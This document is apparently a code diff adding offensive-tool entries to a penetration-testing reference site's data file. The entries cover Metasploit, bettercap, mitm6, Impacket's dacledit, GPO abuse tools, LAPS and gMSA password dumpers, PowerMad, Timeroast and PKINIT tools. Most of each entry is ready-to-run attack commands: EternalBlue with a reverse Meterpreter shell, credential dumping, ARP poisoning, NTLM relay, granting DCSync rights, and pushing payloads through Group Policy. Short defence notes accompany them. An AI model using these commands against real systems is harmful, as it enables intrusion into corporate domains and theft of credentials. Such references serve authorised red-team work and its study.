@@ -201,6 +201,194 @@ var TOOLKIT = [
             ]
           }
         ]
+      },
+      {
+              "id": "metasploit",
+              "name": "Metasploit Framework",
+              "url": "https://github.com/rapid7/metasploit-framework",
+              "description": "The de-facto exploitation framework — modules for scanning, exploiting, post-exploitation and pivoting.",
+              "brief": "Metasploit is the exploitation framework that most other tooling is measured against. Around a database of modules — exploits, auxiliary scanners, post-exploitation and encoders — it gives you a consistent workflow: pick a module, set options, run, and (on success) receive a session you can task further. Its Meterpreter payload is a fully-featured in-memory agent with file, token, and pivoting commands.\n\nOn an AD engagement Metasploit is most useful for the fast-path CVEs (EternalBlue/MS17-010, SMBGhost, the Exchange chains) and for its SMB/relay auxiliary modules, plus routing (autoroute + socks_proxy) to pivot into segmented networks. It is loud by design, so treat it as a scanning/exploitation workhorse rather than a stealth C2. Values shown as <…> are placeholders.",
+              "quickReference": [
+                      {
+                              "label": "Console",
+                              "cmd": "msfconsole -q"
+                      },
+                      {
+                              "label": "Search / use a module",
+                              "cmd": "search ms17_010\nuse exploit/windows/smb/ms17_010_eternalblue"
+                      },
+                      {
+                              "label": "Set options and run",
+                              "cmd": "set RHOSTS <ip>\nset LHOST <attacker>\nrun"
+                      },
+                      {
+                              "label": "Pivot through a session",
+                              "cmd": "use post/multi/manage/autoroute\nset SESSION <id>\nrun"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Core workflow",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Pick, configure and fire a module",
+                                              "cmd": "msf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > show options\nmsf6 > set RHOSTS <ip>\nmsf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST <attacker>\nmsf6 > run"
+                                      },
+                                      {
+                                              "label": "Auxiliary scanners (recon, no exploit)",
+                                              "cmd": "use auxiliary/scanner/smb/smb_ms17_010\nuse auxiliary/scanner/smb/smb_login\nset RHOSTS <range>\nrun"
+                                      },
+                                      {
+                                              "label": "Handle a session",
+                                              "cmd": "sessions -l              # list\nsessions -i <id>         # interact\nbackground               # drop back to console"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "Meterpreter essentials",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Host / identity",
+                                              "cmd": "getuid\ngetprivs\nsysinfo\nps"
+                                      },
+                                      {
+                                              "label": "Token & privesc",
+                                              "cmd": "load incognito\nlist_tokens -u\nimpersonate_token '<DOMAIN\\\\user>'\ngetsystem"
+                                      },
+                                      {
+                                              "label": "Credentials & pivot",
+                                              "cmd": "hashdump\nload kiwi ; creds_all\nrun post/multi/manage/autoroute"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "Modules worth knowing on AD",
+                              "type": "table",
+                              "columns": [
+                                      "Module",
+                                      "Use"
+                              ],
+                              "rows": [
+                                      [
+                                              "exploit/windows/smb/ms17_010_eternalblue",
+                                              "EternalBlue — SMBv1 RCE on legacy hosts"
+                                      ],
+                                      [
+                                              "auxiliary/scanner/smb/smb_ms17_010",
+                                              "Safe check for MS17-010 across a range"
+                                      ],
+                                      [
+                                              "exploit/windows/http/exchange_proxyshell_rce",
+                                              "ProxyShell Exchange chain"
+                                      ],
+                                      [
+                                              "post/windows/gather/credentials/domain_hashdump",
+                                              "Pull domain hashes from a DC session"
+                                      ],
+                                      [
+                                              "post/multi/manage/autoroute + auxiliary/server/socks_proxy",
+                                              "Pivot / SOCKS into internal ranges"
+                                      ]
+                              ]
+                      },
+                      {
+                              "title": "OPSEC",
+                              "type": "notes",
+                              "items": [
+                                      "Meterpreter and default payloads are heavily signatured — expect AV/EDR to catch stock builds; it is a scanning/exploitation tool, not stealth C2.",
+                                      "Prefer the auxiliary check modules before firing an exploit that can crash the target (EternalBlue/SMBGhost can bugcheck a box).",
+                                      "Use autoroute + socks_proxy to reach internal hosts through a session instead of exposing more of your infrastructure."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "Metasploit — GitHub",
+                                              "url": "https://github.com/rapid7/metasploit-framework"
+                                      },
+                                      {
+                                              "label": "Vulns & Misconfigs — remote execution",
+                                              "url": "vulns.html"
+                                      },
+                                      {
+                                              "label": "AD Attack-Path map",
+                                              "url": "ad-map.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "bettercap",
+              "name": "bettercap",
+              "url": "https://github.com/bettercap/bettercap",
+              "description": "Swiss-army knife for network attacks and monitoring — ARP/DNS spoofing, sniffing and MITM.",
+              "brief": "bettercap is a modular network-attack and monitoring framework. Through interactive modules (\"caplets\") it performs host discovery, ARP/DNS spoofing, traffic sniffing and man-in-the-middle on a local segment. On an internal engagement it is the tool that puts you in the middle of layer-2 traffic so you can capture or redirect authentication.\n\nFor AD work bettercap pairs with a relay/capture tool: ARP-spoof a victim toward you, then feed the coerced or redirected SMB/HTTP authentication into Responder or ntlmrelayx. It is noisy at layer 2 (gratuitous ARP, duplicate MACs), so use it where dynamic ARP inspection and port security are absent.",
+              "quickReference": [
+                      {
+                              "label": "Start on an interface",
+                              "cmd": "sudo bettercap -iface <iface>"
+                      },
+                      {
+                              "label": "Discover hosts",
+                              "cmd": "net.probe on\nnet.show"
+                      },
+                      {
+                              "label": "ARP spoof a target",
+                              "cmd": "set arp.spoof.targets <victim_ip>\narp.spoof on"
+                      },
+                      {
+                              "label": "Sniff credentials",
+                              "cmd": "set net.sniff.verbose true\nnet.sniff on"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "MITM workflow",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Recon the segment",
+                                              "cmd": "sudo bettercap -iface <iface>\n> net.probe on\n> net.show                      # list discovered hosts"
+                                      },
+                                      {
+                                              "label": "ARP poison and intercept",
+                                              "cmd": "> set arp.spoof.targets <victim_ip>\n> set arp.spoof.fullduplex true\n> arp.spoof on\n> net.sniff on                 # capture traffic passing through you"
+                                      },
+                                      {
+                                              "label": "One-liner via caplet / eval",
+                                              "cmd": "sudo bettercap -iface <iface> -eval 'set arp.spoof.targets <victim>; arp.spoof on; net.sniff on'"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "ARP spoofing is loud — duplicate-MAC and gratuitous-ARP alerts fire on any switch with security features or an NSM watching layer 2.",
+                                      "Pair with Responder (capture) or ntlmrelayx (relay) to turn redirected auth into NetNTLM hashes or code execution — see Coercion & NTLM Relay theory.",
+                                      "Defences: dynamic ARP inspection, DHCP snooping, port security, and 802.1X neutralise it."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "bettercap — GitHub",
+                                              "url": "https://github.com/bettercap/bettercap"
+                                      },
+                                      {
+                                              "label": "Theory — Coercion & NTLM Relay",
+                                              "url": "theory/2026-08-18-coercion-ntlm-relay.html"
+                                      }
+                              ]
+                      }
+              ]
       }
     ]
   },
@@ -2076,6 +2264,1158 @@ var TOOLKIT = [
             ]
           }
         ]
+      },
+      {
+              "id": "mitm6",
+              "name": "mitm6",
+              "url": "https://github.com/dirkjanm/mitm6",
+              "description": "Abuses Windows' IPv6 preference to become the DNS server and funnel authentication for relaying.",
+              "brief": "mitm6 exploits a default Windows behaviour: hosts prefer IPv6 and periodically ask for a DHCPv6 lease and an IPv6 DNS server, even on IPv4-only networks that never answer. mitm6 answers — handing the victim your address as its IPv6 DNS server. From there you selectively answer DNS lookups (for example the WPAD hostname) and redirect the victim's authentication to a relay.\n\nIt is almost always run alongside ntlmrelayx: mitm6 wins the DNS race, the victim authenticates to your spoofed WPAD/host, and ntlmrelayx relays that authentication to LDAP(S) to write RBCD or a shadow credential, or to another unsigned host. Because it is passive at layer 2 (it only answers requests) it is quieter than ARP spoofing, but a rogue DHCPv6 server and a new IPv6 DNS entry are still detectable.",
+              "quickReference": [
+                      {
+                              "label": "Run against a domain",
+                              "cmd": "mitm6 -d <domain>"
+                      },
+                      {
+                              "label": "Relay to LDAP (delegate)",
+                              "cmd": "ntlmrelayx.py -6 -t ldaps://<dc> -wh <fake_wpad> --delegate-access"
+                      },
+                      {
+                              "label": "Interface / scope",
+                              "cmd": "mitm6 -i <iface> -d <domain> --ignore-nofqdn"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Classic mitm6 + relay chain",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Terminal 1 — poison IPv6 DNS",
+                                              "cmd": "mitm6 -d <domain>            # answer DHCPv6 + become the IPv6 DNS server"
+                                      },
+                                      {
+                                              "label": "Terminal 2 — relay to LDAPS",
+                                              "cmd": "ntlmrelayx.py -6 -t ldaps://<dc_ip> -wh <attacker-wpad> --delegate-access\n# --delegate-access writes RBCD from a relayed computer account\n# swap for --escalate-user <you> to grant DCSync via the relayed context"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "Common flags",
+                              "type": "table",
+                              "columns": [
+                                      "Flag",
+                                      "Meaning"
+                              ],
+                              "rows": [
+                                      [
+                                              "-d <domain>",
+                                              "Only spoof DNS for this target domain (reduces blast radius)"
+                                      ],
+                                      [
+                                              "-i <iface>",
+                                              "Interface to run on"
+                                      ],
+                                      [
+                                              "--ignore-nofqdn",
+                                              "Ignore requests without a FQDN"
+                                      ],
+                                      [
+                                              "-hw / --host-whitelist",
+                                              "Limit which hosts are answered"
+                                      ]
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Quieter than ARP spoofing — it only answers solicited DHCPv6/DNS — but a rogue DHCPv6 server and a sudden IPv6 DNS server are strong anomalies.",
+                                      "Defence: disable IPv6 if unused (or RA Guard/DHCPv6 guard), disable WPAD, and enforce LDAP signing + channel binding so the relay fails.",
+                                      "The payoff step is ntlmrelayx to LDAP — read the Coercion & NTLM Relay theory for what the relay writes."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "mitm6 — GitHub (dirkjanm)",
+                                              "url": "https://github.com/dirkjanm/mitm6"
+                                      },
+                                      {
+                                              "label": "Theory — Coercion & NTLM Relay",
+                                              "url": "theory/2026-08-18-coercion-ntlm-relay.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "dacledit",
+              "name": "dacledit.py",
+              "url": "https://github.com/fortra/impacket",
+              "description": "Read and write object DACLs from Linux — the tool that turns an ACL finding into concrete access.",
+              "brief": "dacledit.py (part of Impacket's example scripts) reads and edits the security descriptor — the DACL — of Active Directory objects over LDAP. Where BloodHound tells you that a principal has GenericAll, WriteDacl or WriteOwner over a target, dacledit is how you exercise that right from Linux: add an ACE granting yourself full control, DCSync, or the specific extended right you need.\n\nIt is the general-purpose primitive behind many AD escalation edges. Typical uses are granting yourself DS-Replication rights on the domain head (to DCSync later), giving yourself GenericAll over a user or computer, or backdooring an object's DACL for persistence. Every write is a directory-object change (event 5136), so it is auditable where SACLs are configured.",
+              "quickReference": [
+                      {
+                              "label": "Read an object's DACL",
+                              "cmd": "dacledit.py -action read -target '<samaccountname>' '<domain>/<user>:<pass>'"
+                      },
+                      {
+                              "label": "Grant FullControl over a target",
+                              "cmd": "dacledit.py -action write -rights FullControl -principal <you> -target '<victim>' '<domain>/<user>:<pass>'"
+                      },
+                      {
+                              "label": "Grant yourself DCSync",
+                              "cmd": "dacledit.py -action write -rights DCSync -principal <you> -target-dn '<domain_dn>' '<domain>/<user>:<pass>'"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Enumerate who has rights over an object",
+                                              "cmd": "dacledit.py -action read -target '<victim>' -principal '<you>' '<domain>/<user>:<pass>' -dc-ip <dc_ip>"
+                                      },
+                                      {
+                                              "label": "Write an ACE (escalation)",
+                                              "cmd": "# grant yourself GenericAll over a user you can already influence:\ndacledit.py -action write -rights FullControl -principal '<you>' -target '<victim>' '<domain>/<user>:<pass>'"
+                                      },
+                                      {
+                                              "label": "Grant DCSync on the domain root",
+                                              "cmd": "dacledit.py -action write -rights DCSync -principal '<lowpriv_you>' -target-dn 'DC=<dom>,DC=<tld>' '<domain>/<user>:<pass>'\n# then run secretsdump -just-dc later"
+                                      },
+                                      {
+                                              "label": "Authenticate with a hash / ticket",
+                                              "cmd": "dacledit.py ... -hashes :<nthash>\ndacledit.py ... -k -no-pass        # Kerberos"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "Useful -rights values",
+                              "type": "table",
+                              "columns": [
+                                      "Value",
+                                      "Grants"
+                              ],
+                              "rows": [
+                                      [
+                                              "FullControl",
+                                              "GenericAll — total control of the object"
+                                      ],
+                                      [
+                                              "DCSync",
+                                              "The replication extended rights (Get-Changes / Get-Changes-All)"
+                                      ],
+                                      [
+                                              "WriteMembers",
+                                              "Add members to a group"
+                                      ],
+                                      [
+                                              "ResetPassword",
+                                              "Force-change the target's password"
+                                      ]
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Every write emits directory-service change event 5136 on the object's nTSecurityDescriptor — monitor privileged objects (the domain head, admin groups).",
+                                      "Use -action read first to record the original DACL so you can restore it and to confirm the right actually applies.",
+                                      "This is the execution end of the ACL abuse edges — the concepts are on the ACLs & DACLs theory page."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "Impacket — GitHub (fortra)",
+                                              "url": "https://github.com/fortra/impacket"
+                                      },
+                                      {
+                                              "label": "Theory — ACLs and DACLs",
+                                              "url": "theory/2026-08-18-acls-dacls.html"
+                                      },
+                                      {
+                                              "label": "Theory — DCSync",
+                                              "url": "theory/2026-08-18-dcsync.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "sharpgpoabuse",
+              "name": "SharpGPOAbuse",
+              "url": "https://github.com/FSecureLABS/SharpGPOAbuse",
+              "description": "Turns write access over a GPO into code execution / local admin on every machine in its scope.",
+              "brief": "SharpGPOAbuse abuses a writable Group Policy Object. If you can edit a GPO (WriteProperty/WriteDacl on the GPC, a common ACL finding), you control policy for every computer or user the GPO is linked to. SharpGPOAbuse writes the malicious policy — an immediate scheduled task, a startup script, or a new local-admin membership — that the targeted machines apply at the next policy refresh.\n\nIt is a mass code-execution primitive: one writable GPO linked to a busy OU can mean SYSTEM on dozens of hosts. The changes bump the GPO version and add scheduled-task or registry policy items, which are auditable, so it is powerful but not subtle.",
+              "quickReference": [
+                      {
+                              "label": "Add an immediate task (SYSTEM)",
+                              "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'update' --Author <domain>\\<user> --Command 'cmd.exe' --Arguments '/c <payload>' --GPOName '<GPO>'"
+                      },
+                      {
+                              "label": "Add yourself as local admin",
+                              "cmd": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <you> --GPOName '<GPO>'"
+                      },
+                      {
+                              "label": "User logon task",
+                              "cmd": "SharpGPOAbuse.exe --AddUserTask --TaskName 'x' --Author <a> --Command 'cmd' --Arguments '/c <payload>' --GPOName '<GPO>'"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Computer immediate task → SYSTEM on scoped hosts",
+                                              "cmd": "SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author '<domain>\\<user>' --Command 'powershell.exe' --Arguments '-enc <b64>' --GPOName '<Vulnerable GPO>'"
+                                      },
+                                      {
+                                              "label": "Grant local admin across the OU",
+                                              "cmd": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '<you>' --GPOName '<Vulnerable GPO>'"
+                                      },
+                                      {
+                                              "label": "Force a refresh (or wait ~90 min)",
+                                              "cmd": "# on a host you already control: gpupdate /force"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Bumps the GPO version (GPT.ini) and drops scheduled-task/registry policy — 5136 on the GPC and new tasks are the signal.",
+                                      "Prefer removing the change after execution; a lingering immediate task re-runs and is easy to spot.",
+                                      "pyGPOAbuse is the Linux equivalent when you only have creds and no Windows foothold."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "SharpGPOAbuse — GitHub",
+                                              "url": "https://github.com/FSecureLABS/SharpGPOAbuse"
+                                      },
+                                      {
+                                              "label": "Theory — Group Policy (GPO)",
+                                              "url": "theory/2026-08-18-group-policy.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "pygpoabuse",
+              "name": "pyGPOAbuse",
+              "url": "https://github.com/Hackndo/pyGPOAbuse",
+              "description": "Linux/Python GPO abuse — add an immediate scheduled task to a writable GPO from creds alone.",
+              "brief": "pyGPOAbuse is the cross-platform counterpart to SharpGPOAbuse: given write access to a GPO and only a set of domain credentials (no Windows foothold), it injects an immediate scheduled task into the GPO so the scoped computers run your command as SYSTEM at the next refresh.\n\nIt is the tool to reach for when BloodHound shows a GPO-write edge and you are operating from Linux. The same detection and cleanup considerations as SharpGPOAbuse apply.",
+              "quickReference": [
+                      {
+                              "label": "Add an immediate task",
+                              "cmd": "pygpoabuse.py <domain>/<user>:'<pass>' -gpo-id '<GPO-GUID>' --command 'net localgroup administrators <you> /add'"
+                      },
+                      {
+                              "label": "With a hash",
+                              "cmd": "pygpoabuse.py <domain>/<user> -hashes :<nthash> -gpo-id '<GUID>' --command '<cmd>'"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Inject the task",
+                                              "cmd": "pygpoabuse.py <domain>/<user>:'<pass>' -gpo-id '<GPO-GUID>' \\\n  --command 'cmd.exe' --arguments '/c <payload>'"
+                                      },
+                                      {
+                                              "label": "Find the GPO GUID first",
+                                              "cmd": "# from BloodHound/PowerView; the GUID is the GPC CN, e.g. {31B2F340-...}"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Same footprint as SharpGPOAbuse — version bump + immediate task; audit GPC writes (5136) and unexpected scheduled tasks.",
+                                      "Target a GPO linked to the OU containing your objective (e.g. where a DA logs on) to shorten the path."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "pyGPOAbuse — GitHub (Hackndo)",
+                                              "url": "https://github.com/Hackndo/pyGPOAbuse"
+                                      },
+                                      {
+                                              "label": "Theory — Group Policy (GPO)",
+                                              "url": "theory/2026-08-18-group-policy.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "pylaps",
+              "name": "pyLAPS",
+              "url": "https://github.com/p0dalirius/pyLAPS",
+              "description": "Read (and reset) LAPS-managed local admin passwords over LDAP from Linux.",
+              "brief": "pyLAPS reads the LAPS-managed local administrator password from computer objects over LDAP, and can reset it. LAPS stores each machine's rotating local-admin password in a confidential attribute (ms-Mcs-AdmPwd, or the newer msLAPS-Password), readable only by principals the ACL allows. If you control such a principal — a common delegation finding — pyLAPS hands you working local-admin credentials for those hosts.\n\nIt turns a directory read into lateral movement: read the LAPS password, then authenticate to the host as its local administrator. Reads of the LAPS attribute are auditable (event 4662) where the SACL is set.",
+              "quickReference": [
+                      {
+                              "label": "Dump all readable LAPS passwords",
+                              "cmd": "pyLAPS.py --action get -d <domain> -u <user> -p '<pass>'"
+                      },
+                      {
+                              "label": "Target one computer",
+                              "cmd": "pyLAPS.py --action get -d <domain> -u <user> -p '<pass>' --computer <host>"
+                      },
+                      {
+                              "label": "Also works via NetExec",
+                              "cmd": "nxc ldap <dc_ip> -u <user> -p '<pass>' -M laps"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Read LAPS passwords you have rights to",
+                                              "cmd": "pyLAPS.py --action get -d <domain> -u <user> -p '<pass>' --dc-ip <dc_ip>"
+                                      },
+                                      {
+                                              "label": "Reset a LAPS password (force rotation)",
+                                              "cmd": "pyLAPS.py --action set -d <domain> -u <user> -p '<pass>' --computer <host>"
+                                      },
+                                      {
+                                              "label": "Then log in as local admin",
+                                              "cmd": "nxc smb <host> -u administrator -p '<recovered_laps_pass>' --local-auth"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Reading many machines' LAPS attributes in a burst is unusual — 4662 auditing on the LAPS attribute catches it.",
+                                      "Defence: tightly scope who can read ms-Mcs-AdmPwd / msLAPS-Password; audit delegation on OUs; consider Windows LAPS with encryption."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "pyLAPS — GitHub (p0dalirius)",
+                                              "url": "https://github.com/p0dalirius/pyLAPS"
+                                      },
+                                      {
+                                              "label": "Theory — Windows Credential Storage",
+                                              "url": "theory/2026-08-18-windows-credential-storage.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "gmsadumper",
+              "name": "gMSADumper",
+              "url": "https://github.com/micahvandeusen/gMSADumper",
+              "description": "Recovers group-Managed Service Account passwords over LDAP for principals allowed to read them.",
+              "brief": "gMSADumper retrieves the password blob of a group-Managed Service Account (gMSA). A gMSA's password is managed by AD and readable only by the principals listed in its msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword) attribute. If you control one of those principals, gMSADumper reads the msDS-ManagedPassword blob and derives the account's NT hash.\n\nBecause gMSAs frequently run privileged services, recovering one often yields a high-value credential you can use for pass-the-hash or to Kerberoast dependent SPNs. The read is a normal LDAP query, but access to msDS-ManagedPassword by an unexpected principal is auditable.",
+              "quickReference": [
+                      {
+                              "label": "Dump gMSA passwords",
+                              "cmd": "gMSADumper.py -u <user> -p '<pass>' -d <domain>"
+                      },
+                      {
+                              "label": "With a hash",
+                              "cmd": "gMSADumper.py -u <user> -p :<nthash> -d <domain>"
+                      },
+                      {
+                              "label": "Via NetExec",
+                              "cmd": "nxc ldap <dc_ip> -u <user> -p '<pass>' --gmsa"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Retrieve the managed password / NT hash",
+                                              "cmd": "gMSADumper.py -u <user> -p '<pass>' -d <domain> -l <dc_ip>"
+                                      },
+                                      {
+                                              "label": "Use the recovered hash",
+                                              "cmd": "nxc smb <target> -u '<gmsa$>' -H <nthash>"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Only members of msDS-GroupMSAMembership can read the blob — audit that list and 4662 reads of msDS-ManagedPassword.",
+                                      "A gMSA is only as safe as the principals allowed to read it; a compromised low-priv member exposes the service account."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "gMSADumper — GitHub",
+                                              "url": "https://github.com/micahvandeusen/gMSADumper"
+                                      },
+                                      {
+                                              "label": "Theory — Windows Credential Storage",
+                                              "url": "theory/2026-08-18-windows-credential-storage.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "powermad",
+              "name": "PowerMad",
+              "url": "https://github.com/Kevin-Robertson/Powermad",
+              "description": "Create and manage machine accounts (MachineAccountQuota) — the building block for RBCD attacks.",
+              "brief": "PowerMad is a PowerShell toolkit whose headline function, New-MachineAccount, lets a normal domain user add a computer account to the domain using the default ms-DS-MachineAccountQuota of 10. That attacker-controlled machine account is the missing piece for resource-based constrained delegation (RBCD) and several certificate attacks — you need a principal with an SPN that you control.\n\nIt also manages the account's attributes (SPNs, dNSHostName) used in noPac and Certifried-style abuses. Creating a computer object is logged (event 4741); the strongest defence is setting the quota to zero.",
+              "quickReference": [
+                      {
+                              "label": "Add a computer account",
+                              "cmd": "New-MachineAccount -MachineAccount <fakepc> -Password $(ConvertTo-SecureString '<Pass123!>' -AsPlainText -Force)"
+                      },
+                      {
+                              "label": "Read the quota",
+                              "cmd": "Get-MachineAccountAttribute -MachineAccount <fakepc> -Attribute ms-DS-MachineAccountQuota"
+                      },
+                      {
+                              "label": "Set an SPN / dNSHostName",
+                              "cmd": "Set-MachineAccountAttribute -MachineAccount <fakepc> -Attribute dNSHostName -Value <value>"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Create the RBCD principal",
+                                              "cmd": "Import-Module .\\Powermad.ps1\nNew-MachineAccount -MachineAccount 'fakepc' -Password $(ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)\n# default MachineAccountQuota = 10 allows any user to do this"
+                                      },
+                                      {
+                                              "label": "From Linux instead",
+                                              "cmd": "addcomputer.py -computer-name 'fakepc$' -computer-pass 'Pass123!' <domain>/<user>:'<pass>'"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "New computer objects created by a non-admin (4741) are anomalous — alert on them.",
+                                      "Set ms-DS-MachineAccountQuota to 0 and delegate machine-join to a controlled group; this removes the precondition for RBCD, noPac and Certifried."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "Powermad — GitHub",
+                                              "url": "https://github.com/Kevin-Robertson/Powermad"
+                                      },
+                                      {
+                                              "label": "Theory — Kerberos Delegation",
+                                              "url": "theory/2026-08-18-delegation.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "timeroast",
+              "name": "Timeroast",
+              "url": "https://github.com/SecuraBV/Timeroast",
+              "description": "Recovers computer-account hashes over MS-SNTP (NTP) with no authentication, to crack offline.",
+              "brief": "Timeroast abuses MS-SNTP, the authenticated variant of NTP that domain controllers speak. A DC will answer a specially crafted time request with a message authentication code computed from a computer account's password hash — and it does so without the requester authenticating. Timeroast collects these responses for a range of RIDs, giving you crackable hashes for machine accounts.\n\nMachine-account passwords are normally long and random, so most won't crack — but misconfigured or manually-set computer passwords, and some service/appliance accounts, do fall. It is an unauthenticated collection technique, which makes it a useful early-access option.",
+              "quickReference": [
+                      {
+                              "label": "Collect hashes from a DC",
+                              "cmd": "timeroast.py <dc_ip> -o timeroast.txt"
+                      },
+                      {
+                              "label": "Crack (hashcat mode 31300)",
+                              "cmd": "hashcat -m 31300 timeroast.txt wordlist.txt"
+                      },
+                      {
+                              "label": "Target a RID range",
+                              "cmd": "timeroast.py <dc_ip> -a <rid_low> -b <rid_high>"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Harvest machine-account hashes (no creds)",
+                                              "cmd": "timeroast.py <dc_ip> -o timeroast.txt"
+                                      },
+                                      {
+                                              "label": "Crack offline",
+                                              "cmd": "hashcat -m 31300 timeroast.txt /usr/share/wordlists/rockyou.txt"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Entirely offline once collected; the only network signal is unusual volumes of NTP authentication requests to the DC.",
+                                      "Most machine passwords are random and won't crack — value comes from manually-set or appliance accounts. Defence: ensure strong, auto-rotated computer passwords."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "Timeroast — GitHub (SecuraBV)",
+                                              "url": "https://github.com/SecuraBV/Timeroast"
+                                      },
+                                      {
+                                              "label": "Theory — Kerberos Authentication",
+                                              "url": "theory/2026-08-18-kerberos.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "gettgtpkinit",
+              "name": "gettgtpkinit",
+              "url": "https://github.com/dirkjanm/PKINITtools",
+              "description": "Requests a Kerberos TGT using a certificate (PKINIT) — the bridge from a cert to a ticket.",
+              "brief": "gettgtpkinit (from PKINITtools) performs the PKINIT exchange: it presents a certificate and its private key to the KDC and receives a Kerberos TGT for the certificate's identity. It is the Linux tool that turns any client-authentication certificate — from AD CS abuse (ESC1 etc.) or a Shadow Credential — into a usable ticket.\n\nIt pairs with getnthash (also in PKINITtools) to perform UnPAC-the-hash: once you hold the PKINIT TGT and its session key, you can recover the account's NT hash from the ticket's PAC_CREDENTIAL_INFO, unifying the certificate and hash worlds.",
+              "quickReference": [
+                      {
+                              "label": "Cert → TGT",
+                              "cmd": "gettgtpkinit.py -cert-pfx <user>.pfx -pfx-pass <pfx_pass> <domain>/<user> user.ccache"
+                      },
+                      {
+                              "label": "Use the ticket",
+                              "cmd": "export KRB5CCNAME=user.ccache ; nxc smb <target> -k --use-kcache"
+                      },
+                      {
+                              "label": "UnPAC the hash",
+                              "cmd": "getnthash.py -key <AS-REP-key> <domain>/<user>"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Obtain a TGT from a certificate",
+                                              "cmd": "gettgtpkinit.py -cert-pfx <user>.pfx -pfx-pass '<pfx_pass>' <domain>/<user> user.ccache\n# prints the AS-REP encryption key you need for UnPAC-the-hash"
+                                      },
+                                      {
+                                              "label": "Recover the NT hash (UnPAC)",
+                                              "cmd": "getnthash.py -key '<as_rep_key>' <domain>/<user>\n# certipy auth -pfx <user>.pfx also does cert->TGT and prints the hash in one step"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
